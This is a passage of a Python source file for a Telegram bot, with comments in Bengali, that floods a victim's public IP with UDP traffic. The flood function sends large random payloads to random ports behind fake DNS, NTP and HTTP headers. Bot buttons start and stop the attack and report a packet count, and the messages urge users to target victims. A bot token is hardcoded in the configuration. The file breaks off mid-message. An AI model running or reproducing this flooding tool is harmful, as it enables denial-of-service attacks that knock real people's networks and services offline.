import os
import socket
import multiprocessing
import random
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- কনফিগারেশন ---
TOKEN = "8620529154:AAHcN6529pcI8F6i417poylsymr0yLFkEhQ"
manager = multiprocessing.Manager()
shared_data = manager.dict()
shared_data['attacking'] = False
shared_data['packets_sent'] = 0
shared_data['target'] = ""

# ওবলিভিয়ন ফ্লাড ইঞ্জিন (Extreme Network Crusher)
def oblivion_flood(ip, shared_dict):
    # সকেট লেভেল অপ্টিমাইজেশন (UDP)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # বিশাল এবং র‍্যান্ডম পেলোড (৫১২ থেকে ১০২৪০ বাইট)
    # এটি রাউটারের ব্যান্ডউইথ এবং প্রসেসর উভয়কেই জ্যাম করবে
    payloads = [
        random._urandom(1024), 
        random._urandom(4096), 
        random._urandom(8192),
        random._urandom(10240) 
    ]
    
    # ফেক প্রোটোকল হেডার (ISP-কে কনফিউজ করার জন্য)
    headers = [
        b"\x12\x34\x56\x78", # DNS Query
        b"\x00\x00\x00\x00\x00\x01\x00\x00", # NTP 
        b"GET / HTTP/1.1\r\nHost: " + str(ip).encode() + b"\r\n\r\n" # HTTP Fake
    ]
    
    while shared_dict['attacking']:
        try:
            # ১. র‍্যান্ডম হাই-রেঞ্জ পোর্ট (১ - ৬৫৫৩৫)
            port = random.randint(1, 65535)
            
            # ২. স্মার্ট পেলোড সিলেকশন
            data = random.choice(headers) + random.choice(payloads)
            
            # ৩. সরাসরি অ্যাটাক (No Delay)
            client.sendto(data, (ip, port))
            shared_dict['packets_sent'] += 1
            
        except:
            continue
    client.close()

# ১. স্টার্ট কমান্ড (বড় বাটন আসবে)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🚀 START OBLIVION ATTACK")],
        [KeyboardButton("📊 LIVE STATUS"), KeyboardButton("🛑 STOP ATTACK")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    text = (
        "🔥 *MR DEVELOPER - OBLIVION V7 (ULTIMATE)* 🔥\n\n"
        "এটি আপনার রেলওয়ে সার্ভারের সর্বোচ্চ ক্ষমতা ব্যবহার করবে।\n"
        "ওয়াইফাই বা মোবাইল ডাটা—কোনোটিই এই প্রেশার সামলাতে পারবে না।\n\n"
        "⚠️ *সতর্কতা:* শুধুমাত্র ভিকটিমের **Public IP** ব্যবহার করুন।"
    )
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

# ২. মেইন হ্যান্ডলার
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "🚀 START OBLIVION ATTACK":
        await update.message.reply_text("🎯 *ভিকটিমের Public IP Address দিন:*", parse_mode='Markdown')
        context.user_data['waiting_for_ip'] = True
        return

    if user_text == "📊 LIVE STATUS":
        if shared_data['attacking']:
            await update.message.reply_text(
                f"📡 *OBLIVION LIVE FEED:*\n\n"
                f"📍 Target: `{shared_data['target']}`\n"
                f"📤 Packets: `{shared_data['packets_sent']}`\n"
                f"⚡ Mode: Oblivion (Max Power)\n"
                f"📶 Result: Network Is Crashing", 
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ বর্তমানে কোনো অ্যাটাক চলছে না।")
        return

    if user_text == "🛑 STOP ATTACK":
        shared_data['attacking'] = False
        await update.message.reply_text("✅ *অ্যাটাক সফলভাবে বন্ধ করা হয়েছে। ডিভাইস এখন স্বাভাবিক হবে।*", parse_mode='Markdown')
        return

    if context.user_data.get('waiting_for_ip'):
        target_ip = user_text.strip()
        context.user_data['waiting_for_ip'] = False
        
        shared_data['attacking'] = True
        shared_data['target'] = target_ip
        shared_data['packets_sent'] = 0
        
        await update.message.reply_text(
            f"⚔️ *OBLIVION ATTACK INITIALIZED!*\n\n"
            f"📍 *Target IP:* `{target_ip}`\n"
            f"🚀 *Power:* 20 Multiprocessing Cores\n"
          
